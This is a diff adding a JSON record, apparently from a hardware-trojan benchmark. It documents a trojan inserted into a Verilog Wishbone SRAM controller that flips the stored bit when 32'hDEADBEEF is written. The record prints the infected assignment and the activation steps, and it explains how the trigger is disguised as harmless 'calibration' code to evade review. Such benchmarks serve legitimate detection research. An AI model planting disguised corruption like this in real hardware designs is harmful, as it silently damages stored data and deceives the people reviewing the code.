@@ -1,0 +1,58 @@
+{
+  "design": "sram",
+  "category": "cat1_combinational_rare_trigger",
+  "target_file": "wb_sram_controller.v",
+  "target_module": "wb_sram_controller",
+  "new_signals": [
+    {
+      "name": "wr_cal",
+      "type": "wire",
+      "width": 1,
+      "comment_in_source": "write-data calibration check, reused for full-word store bookkeeping"
+    }
+  ],
+  "trigger_condition": {
+    "expression": "wr_cal = (wb_dat_i == 32'hDEADBEEF)",
+    "checked_at": "the S_IDLE state's combinational full-word-write branch (wb_valid & wb_we_i & (wb_sel_i == 4'b1111))",
+    "inputs_used": [
+      {
+        "name": "wb_dat_i",
+        "pre_existing": true,
+        "description": "existing 32-bit Wishbone write-data input, already the sole source for sram_din on this exact branch in the clean design"
+      }
+    ],
+    "magic_value": "32'hDEADBEEF",
+    "magic_value_derivation": "arbitrary rare 32-bit value, confirmed not to collide with any data word the design's own golden testbench ever writes -- computed directly by replaying the golden testbench's own deterministic LCG PRNG (seed 32'h1234_5678, same recurrence) for the 260 random words it actually generates (128 exhaustive full-word writes + 128 RMW-sweep new-data values + 4 back-to-back values), none of which equal 32'hDEADBEEF, and cross-checked against every explicit literal the golden testbench writes (32'hB0B0B0B0, 32'hE0E0E0E0, 32'hBAADF00D, 32'hC0FFEE00, 32'h11223344) -- confirmed experimentally by running the unmodified golden testbench against this infected file: Eval1 PASS"
+  },
+  "payload": {
+    "clean_behavior": "sram_din = wb_dat_i;  // full write",
+    "infected_behavior": "sram_din = wr_cal ? (wb_dat_i ^ 32'h00000001) : wb_dat_i;  // full write",
+    "description": "when the host performs a full-word write (wb_sel_i==4'hF) with write data exactly equal to 32'hDEADBEEF, the word actually committed to the SRAM macro is corrupted by flipping its least-significant bit (XOR 32'h00000001) instead of storing the real value. Every other write value, and the entire read-modify-write (partial byte-select) path, is loaded exactly as in the clean design -- including a byte-select write whose write-data register also happens to equal 32'hDEADBEEF, since that path never reaches the corrupted full-word branch at all."
+  },
+  "activation_requirements": {
+    "top_level_interface": "real Wishbone top-level ports of wb_sram_controller (write + read-back); no internal/hierarchical probing of either DUT",
+    "procedure": [
+      "issue a full-word write (wb_sel_i=4'hF) with wb_dat_i=32'hDEADBEEF at any in-range address",
+      "read the same address back -- the infected design returns 32'hDEADBEEE (DEADBEEF XOR 1) instead of the written 32'hDEADBEEF"
+    ]
+  },
+  "one_shot_or_persistent": "fires independently on every full-word write that happens to write exactly the magic value; the corrupted word then persists in memory until overwritten, same as any other stored word -- there is no separate one-shot latch or arming state",
+  "verification": {
+    "eval0_synthesis": {
+      "tool": "Yosys 0.33 + sky130_fd_sc_hd (tt_025C_1v80) liberty",
+      "result": "PASS",
+      "notes": "0 ERROR lines, full technology mapping of both design files, top-module chip area 156463.8112 um^2 (large area reflects the 128x32 memory array synthesizing to flip-flops in the absence of a real SRAM macro mapping step, expected and identical in kind to the clean design)"
+    },
+    "eval1_dormancy": {
+      "tool": "Icarus Verilog 12.0, unmodified golden tb_wb_sram_controller.v",
+      "result": "PASS (SIMULATION PASSED)",
+      "notes": "the golden testbench exhaustively writes all 128 addresses plus a 16-pattern byte-select sweep plus back-to-back transactions -- 260 PRNG-generated words total, none equal to 32'hDEADBEEF (confirmed both by replaying the exact same LCG recurrence offline and by this real tool run) -- plus 5 explicit literal words, none colliding either, so the trigger never activates and every exact-latency assertion in the golden testbench passes unchanged"
+    },
+    "eval2_activation": {
+      "tool": "Icarus Verilog 12.0, standalone dual-DUT activation testbench through real top-level Wishbone ports",
+      "result": "PASS (TROJAN ACTIVATION CONFIRMED)",
+      "notes": "6 checkpoints: 3 ordinary-data near-misses at different addresses including the last word (all match exactly), 2 TRIGGER checkpoints at different addresses (both show clean=DEADBEEF vs infected=DEADBEEE), 1 RMW near-miss where the write-data register equals the magic value but wb_sel_i != 4'hF (matches on both DUTs, confirming the full-word branch is never taken on the RMW path) -- 0 unexpected mismatches, 2 documented trigger confirmations"
+    }
+  },
+  "stealth_rationale": "the only new signal, wr_cal, is named and commented as ordinary write-data calibration bookkeeping with no trigger/trojan/corruption terminology; the diff against the clean file is a 2-line wire declaration/comment and a one-line change to a single existing combinational branch -- port list, parameters, and the module's SRAM-macro instantiation are all untouched; the payload sits inline inside the one combinational assignment a reviewer would already expect to see (sram_din for a full write), rather than as an obviously separate new block"
+}
